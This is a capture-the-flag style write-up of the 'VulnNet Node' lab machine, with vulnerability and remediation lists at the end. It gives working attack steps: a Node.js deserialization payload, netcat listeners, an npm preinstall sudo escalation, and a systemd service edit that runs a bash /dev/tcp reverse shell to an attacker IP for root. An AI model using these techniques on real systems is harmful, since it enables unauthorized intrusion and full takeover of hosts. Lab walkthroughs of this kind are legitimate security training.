## VulnNet Node

Medium-difficulty Linux machine. A Node.js web application used unsafe cookie deserialization, which gave remote code execution as `www`. An npm sudo rule enabled privilege escalation to `serv-manage`. A systemd timer that the user could control gave root.

**Target:** 10.48.189.16 (VulnNet Node)
**Series:** VulnNet Entertainment
**Difficulty:** Medium
**Attack Path:** Port scan → Web enumeration → Cookie manipulation → Node.js deserialization RCE → Reverse shell → npm preinstall escalation → Systemd timer modification → Root

### PART 2: WEB ENUMERATION

**Directory fuzzing**

```
gobuster dir -u http://10.48.189.16:8080/ -w <wordlist>
```

Results include `/login`, `/css`, `/img`. No hidden endpoints were found.

**Cookie inspection**

The application sets a cookie in base64 and URL-encoded format. Decoded, it reads:

```json
{"username":"Admin","isAdmin":true,"encoding":"utf-8"}
```

**Why this matters:** The cookie stores a JSON object with an `isAdmin` flag. If the application deserializes this cookie without validation, untrusted data becomes executable code.

---

### PART 3: NODE.JS UNSAFE DESERIALIZATION

**Background:** Node.js has a built-in `unserialize` function that can execute arbitrary code hidden in serialized data. When used on user-controlled input like a cookie, it becomes a remote code execution vulnerability.

**Public exploit available**

The exploit uses Node.js native `_$$ND_FUNC$$_` markers to inject function code into serialized data. A public Python script generates the payload:

```
python2 node.py 192.168.136.69 4444
```

This outputs a payload like:

```json
{"rce":"_$$ND_FUNC$$_function (){/* payload */}()"}
```

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Trigger the exploit**

Set the cookie value to the payload generated by the script. When the application deserializes it, the injected function executes.

**Result:**

```
connect to [192.168.136.69] from (UNKNOWN) [10.48.189.16] 39276
Connected!
id
uid=1001(www) gid=1001(www) groups=1001(www)
```

Remote code execution as `www` user.

### PART 5: FIRST PRIVILEGE ESCALATION (npm)

**Check sudo rights**

```
sudo -l
```

```
User www may run the following commands on ip-10-48-189-16:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

The `www` user can run `npm` as `serv-manage` without a password.

**Why npm is dangerous:** npm reads a `package.json` file that defines build scripts. The `preinstall` script runs before dependencies are installed. If we control `package.json`, we control what runs.

**Exploit steps**

Create a directory with a malicious `package.json`:

```bash
mkdir test
echo '{"scripts": {"preinstall": "/bin/sh"}}' > test/package.json
```

Run npm with that directory:

```bash
sudo -u serv-manage /usr/bin/npm -C test i
```

npm reads the `package.json` in `test/`, runs the preinstall script (`/bin/sh`), and that shell runs as `serv-manage`.

**Result:**

```
> @ preinstall /home/www/test
> /bin/sh

$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

Shell as `serv-manage`.

**User flag**

```
cat ~/user.txt
```

### PART 6: SECOND PRIVILEGE ESCALATION (systemd timer)

**Check sudo rights for serv-manage**

```
sudo -l
```

```
User serv-manage may run the following commands on ip-10-48-189-16:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

The user can start, stop, and reload systemd units as root.

**What is a timer?** systemd timers are like cron jobs. They run services on a schedule. The `vulnnet-auto.timer` unit is configured to run a service periodically.

**Find the service file**

Systemd services are in `/etc/systemd/system/` or `/usr/lib/systemd/system/`. The timer `vulnnet-auto.timer` likely calls a service such as `vulnnet-auto.service`.

**Modify the service**

If the `serv-manage` user can read and write the service file, we can change what command it runs. Edit the service file to execute a reverse shell:

```
ExecStart=/bin/bash -c 'exec /bin/bash -i &>/dev/tcp/192.168.136.69/5555 <&1'
```

**Reload and trigger the timer**

```
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start vulnnet-auto.timer
```

When the timer fires, it runs the modified service with root privileges.

**Attacker: start a listener on port 5555**

```
nc -lvnp 5555
```

**Result:**

```
connect to [192.168.136.69] from (UNKNOWN) [10.48.189.16] 37378
root@ip-10-48-189-16:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell achieved.

**Root flag**

```
cat /root/root.txt
```

### VULNERABILITIES

1. **Unsafe Node.js Deserialization (Critical)**
   - Application deserializes user-supplied cookies without validation
   - Allows arbitrary code execution through `_$$ND_FUNC$$_` markers

2. **npm Sudo Rule (High)**
   - `npm` can be run as `serv-manage` without password
   - npm reads user-controlled package.json files
   - preinstall script executes before dependency resolution

3. **Systemd Timer Control (Critical)**
   - Service files can be modified by `serv-manage`
   - User can reload and start timers that run as root
   - No verification that service content is safe

4. **Insufficient File Permissions (High)**
   - Systemd service file is writable by a non-root user
   - Timer execution as root with user-controlled command

---

### REMEDIATION

```
├─ Never deserialize untrusted data; use JSON.parse only and validate structure
├─ Remove npm from sudo unless absolutely required; if needed, restrict to specific scripts
├─ Restrict write access to systemd service and timer files (root ownership, 0644 or stricter)
├─ Use signed or verified configuration; monitor for unauthorized modifications
├─ Implement file integrity checks (aide, tripwire) on critical systemd units
├─ Audit all NOPASSWD sudo rules and remove unnecessary ones
└─ Run services with minimal required privileges
```
